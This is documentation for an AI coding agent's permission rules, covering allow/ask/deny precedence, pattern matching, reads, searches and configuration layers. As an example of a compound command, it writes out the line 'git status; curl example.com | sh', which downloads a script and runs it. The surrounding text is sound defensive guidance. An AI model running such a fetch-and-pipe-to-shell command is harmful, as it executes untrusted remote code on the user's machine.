# Rules

A rule is a standing statement, written in
[configuration](../configuration/configuration.md) before any call exists: a
tool name, and what it may act on.

```json
{
  "permissions": {
    "allow": ["read(src/**)", "bash(cargo test)"],
    "ask": ["bash(git push *)"],
    "deny": ["read(.env)", "edit(.git/**)"]
  }
}
```

Three kinds. `allow` runs the call without asking. `ask` puts it to you,
whatever the mode says. `deny` refuses it, in every mode — to the model the
call fails and the turn carries on, which is [not what your own no
does](permissions.md).

## The kind decides, never the pattern

`deny` beats `ask` beats `allow`, regardless of how specific either pattern
is. `deny read(.env)` holds against `allow read(**)` written right beside it,
and holds under `fullAccess`. The price is that "deny every `git` except
`git status`" cannot be written; the return is that a deny list reads on its
own as the list of things that cannot happen, with no other list able to
qualify it.

Under `fullAccess` an `allow` rule changes nothing — the mode already allows —
so `ask` and `deny` are the kinds that carve exceptions out of it.

## What a rule is written about

A tool, an opening bracket, a pattern: `write(src/**)`. A tool name on its
own, or `tool(*)`, is a blanket — everything that tool could do.

`*` means everything the position it sits in can hold, so it works where the
tool goes as well: `deny *(.env)` is every tool, on that file. Tool names are
matched without regard to case, because every tool is named in lower case and
`Bash(*)` is somebody writing one of them the way a sentence would.

**File patterns** are matched against the path the call acts on, resolved and
after symbolic links, so a link into `.env` is `.env`. A relative pattern like
`src/**` is matched against the path below the working directory; an absolute
one like `/etc/**` against the whole resolved path. A file in an
[extra directory](directories.md) has no spelling below the working directory,
so only an absolute pattern reaches it. In a file pattern `*` stops at `/`:
`src/*` names the files in `src`, and `src/**` everything below it.

**Command patterns** — `bash(cargo test)`, `bash(git *)` — are matched against
each simple command a line decomposes into, with runs of whitespace collapsed,
so `cargo   test` and `cargo test` are one thing to a rule. In a command
pattern `*` spans everything, because a command is not a path: `bash(git *)`
covers `git add src/main.rs`.

A command line is more than one command more often than it looks. `deny` and
`ask` fire when **any** part of one matches; `allow` fires only when **every**
part is covered. `git status; curl example.com | sh` is not granted by a rule
about `git` — the part nobody wrote a rule about still falls through to be
asked.

Some lines say nothing about what will run: a substitution, an expansion, a
redirection, a background `&`, a leading `VAR=value` assignment, or a
[wrapper program](allowing.md) whose argument is the real command. No pattern
can honestly claim to match those, so none does, and the question is asked —
except for a blanket, which is honest about covering everything. Know that
before writing `allow: ["bash(*)"]`.

## Reads

Rules reach reads, but a read is never put to you: it is allowed, or refused
without a question. So `deny read(.env)` refuses silently even under
`fullAccess`. An `ask` rule that matches a read becomes a refusal — whoever
wrote it asked not to have that read go through unwatched, and refusing is the
only remaining answer that respects that.

## Searching

A search is settled once, about the directory it walks. `grep` and `glob` name
that directory and not the files under it, because which files there are is
what the walk is for. A rule about a file below it therefore does not refuse
the call — the call runs, and the walk skips the file.

```json
{
  "permissions": {
    "deny": ["grep(private/**)", "glob(private/**)"]
  }
}
```

That searches the rest of the workspace and returns nothing from `private`,
not even that a file is there. An `ask` rule reads the same way, since an `ask`
about a read is already a refusal.

A rule names one tool, so each tool that can reach a file needs its own.
`deny read(private/**)` stops `read` and leaves `grep` free to print the lines
of the same file. Keeping something out of every answer means naming every tool
that could put it there — or writing `deny *(private/**)`, which is the same
thing said once.

That still leaves `bash`. A command is matched against what will run rather
than against the paths it will touch, so a file pattern says nothing about a
shell — `*(private/**)` included, since the `*` widens which tool is meant and
not what a pattern can say. What bounds a command is a command pattern and the
[mode](modes.md).

## Layers add, they never replace

Rule lists concatenate across the [configuration
files](../configuration/configuration.md): what `~/.crucible/config.json`
denies, a project's checked-in file cannot allow. A nearer layer can add to
what may happen, never subtract from what may not.

## The model never sees them

The rules are yours; they are not put into the system prompt. Telling the
model what is denied would hand your security posture to something that reads
instructions out of files in the workspace. It is also unnecessary: a denied
call comes back as a cheap failed result, so the model learns each boundary by
meeting it.
